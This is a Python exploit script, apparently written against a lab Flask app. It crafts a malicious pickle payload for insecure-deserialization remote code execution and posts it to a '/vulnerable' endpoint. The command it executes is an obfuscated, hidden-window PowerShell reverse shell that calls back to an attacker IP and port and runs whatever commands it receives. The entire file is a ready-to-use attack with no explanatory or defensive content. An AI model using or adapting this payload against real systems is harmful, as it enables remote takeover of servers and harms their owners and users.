#!/usr/bin/python

import pickle
import base64
import requests
import sys

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system, (command,))

default_url = 'http://127.0.0.1:5000/vulnerable'
url = sys.argv[1] if len(sys.argv) > 1 else default_url

# Change to the attacker's IP address and port number
ip_address = '192.168.1.23'
port = 4444

# PowerShell command for reverse shell
command = f'powershell -nop -w hidden -noni -ep bypass ' \
          f'-c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip_address}\', {port});' \
          f'$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};' \
          f'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;' \
          f'$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);' \
          f'$sendback = (iex $data 2>&1 | Out-String );' \
          f'$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';' \
          f'$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);' \
          f'$stream.Write($sendbyte,0,$sendbyte.Length);' \
          f'$stream.Flush()}};$client.Close()"'

pickled = 'pickled'  # This is the POST parameter of our vulnerable Flask app
payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting Payload
requests.post(url, data={pickled: payload})  # Sending POST request
